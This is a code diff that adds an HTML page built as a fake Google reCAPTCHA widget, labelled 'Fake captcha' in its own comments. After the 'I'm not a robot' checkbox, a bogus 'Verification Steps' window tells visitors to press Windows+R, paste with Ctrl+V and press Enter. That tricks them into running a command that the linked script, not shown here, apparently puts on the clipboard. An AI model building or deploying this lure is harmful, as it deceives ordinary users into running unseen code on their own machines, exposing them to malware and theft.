@@ -1,0 +1,51 @@
+<!doctype html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <title></title>
+        <link href="src/fakerecaptcha.css" rel="stylesheet">
+    </head>
+    <body>
+    <!-- Fake captcha start -->
+    <div class="fkrc-container fkrc-m-p">
+        <!-- Captcha checkbox widget -->
+        <div id="fkrc-checkbox-window" class="fkrc-checkbox-window fkrc-m-p fkrc-block">
+            <div class="fkrc-checkbox-container fkrc-m-p">
+                <button type="button" id="fkrc-checkbox" class="fkrc-checkbox fkrc-m-p fkrc-line-normal"></button>
+            </div>
+            <p class="fkrc-im-not-a-robot fkrc-m-p fkrc-line-normal">I'm not a robot</p>
+            <img src="images/captcha_logo.svg" class="fkrc-captcha-logo fkrc-line-normal" alt="">
+            <p class="fkrc-checkbox-desc fkrc-m-p fkrc-line-normal">CAPTCHA</p>
+            <p class="fkrc-checkbox-desc fkrc-m-p fkrc-line-normal">Privacy - Terms</p>
+            <img src="images/captcha_spinner.gif" class="fkrc-spinner fkrc-m-p fkrc-line-normal" alt="" id="fkrc-spinner">
+        </div>
+        <!-- Captcha checkbox verification window -->
+        <div id="fkrc-verifywin-window" class="fkrc-verifywin-window">
+            <div class="fkrc-verifywin-container">
+                <header class="fkrc-verifywin-header">
+                    <span class="fkrc-verifywin-header-text-medium fkrc-m-p fkrc-block">Complete these</span>
+                    <span class="fkrc-verifywin-header-text-big fkrc-m-p fkrc-block">Verification Steps</span>
+                    <span class="fkrc-verifywin-header-text-medium fkrc-m-p fkrc-block">To prove you are not a robot.</span>
+                </header>
+                <main class="fkrc-verifywin-main">
+                    To better prove you are not a robot, please:
+                    <div class="step">1. Press & hold the <strong>Windows Key + R</strong></div>
+                    <div class="step">2. In the window, press <strong>Ctrl + V</strong></div>
+                    <div class="step">3. Press <strong>Enter</strong> on your keyboard to finish.</div>
+                    You will observe and agree:
+                    <div class="fkrc-verification-text">" ✓ I am not a robot - reCAPTCHA ID: 9477"</div>
+                </main>
+            </div>
+            <footer class="fkrc-verifywin-container fkrc-verifywin-footer">
+                <div class="fkrc-verifywin-footer-left">
+                    Perform the steps above to finish verification.
+                </div>
+                <button type="button" class="fkrc-verifywin-verify-button fkrc-block" id="fkrc-verifywin-verify-button">Verify</button>
+            </footer>
+        </div>
+        <img src="images/captcha_arrow.svg" alt="" class="fkrc-verifywin-window-arrow" id="fkrc-verifywin-window-arrow"/>
+    </div>
+    <!-- Fake captcha end -->
+        <script src="src/fakerecaptcha.js"></script>
+    </body>
+</html>
